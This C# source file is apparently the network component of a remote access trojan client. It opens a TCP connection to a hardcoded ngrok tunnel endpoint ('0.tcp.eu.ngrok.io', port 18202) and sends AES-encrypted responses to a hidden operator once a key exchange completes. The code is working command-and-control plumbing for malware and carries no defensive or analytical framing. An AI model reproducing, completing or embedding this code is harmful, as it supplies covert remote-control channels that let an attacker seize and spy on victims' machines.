using System.Net.Sockets;
using System.Text;
using Client.Crypto;

namespace Client.Conexion
{
    static class ClientSocket
    {
        private static TcpClient client;
        private static NetworkStream stream;
        private static bool connected = true;
        private static readonly string serverAddr = "0.tcp.eu.ngrok.io";
        private static readonly int serverPort = 18202;

        public static void connect()
        {
            client = new TcpClient(serverAddr, serverPort);
            stream = client.GetStream();
        }

        public static void disconnect()
        {
            client.Close();
        }

        public static void SendResponse(string response, Channel ch)
        {
            byte[] data = Encoding.UTF8.GetBytes(response);
            byte[] aesKeyClient = ClienteRAT.getAesKey();

            // Solo cifrar si la clave ya está negociada y no es KeyExchange
            if (aesKeyClient != null && ch != Channel.KeyExchange)
                data = AesHelper.EncryptWithAes(data, aesKeyClient);

            Protocol.Send(stream, ch, data);
        }



        public static bool isConnected() { return connected; }

        public static NetworkStream getClientStream() { return stream; }

        public static void setConnected(bool con) { connected = con; }

      
    }
}
